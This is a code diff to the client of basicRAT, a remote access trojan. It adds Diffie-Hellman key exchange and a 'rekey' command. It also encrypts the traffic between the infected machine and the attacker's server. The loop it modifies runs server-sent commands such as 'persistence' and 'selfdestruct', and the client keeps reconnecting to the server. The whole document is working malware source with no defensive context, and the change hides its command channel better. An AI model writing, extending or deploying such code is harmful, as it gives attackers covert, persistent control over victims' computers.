@@ -31,12 +31,12 @@ else:
     PLAT = 'unk'
 
 
-def client_loop(conn):
+def client_loop(conn, dhkey):
     while True:
         results = ''
 
         # wait to receive data from server
-        data = conn.recv(4096)
+        data = crypto.decrypt(conn.recv(4096), dhkey)
 
         # seperate data into command and action
         cmd, _, action = data.partition(' ')
@@ -55,6 +55,9 @@ def client_loop(conn):
             conn.shutdown(socket.SHUT_RDWR)
             conn.close()
             break
+
+        elif cmd == 'rekey':
+            dhkey = crypto.diffiehellman(conn)
 
         elif cmd == 'persistence':
             results = persistence.run(PLAT)
@@ -76,21 +79,24 @@ def client_loop(conn):
             toolkit.selfdestruct(PLAT)
 
         results += '\n{} completed.'.format(cmd)
-        conn.send(results)
+
+        conn.send(crypto.encrypt(results, dhkey))
 
 
 def main():
-    # connect to basicRAT server
     while True:
         conn = socket.socket()
+
         try:
+            # attempt to connect to basicRAT server
             conn.connect((HOST, PORT))
         except socket.error:
             time.sleep(CONN_TIMEOUT)
             continue
-        # conn.setblocking(0)
 
-        client_loop(conn)
+        dhkey = crypto.diffiehellman(conn)
+
+        client_loop(conn, dhkey)
 
 
 if __name__ == '__main__':
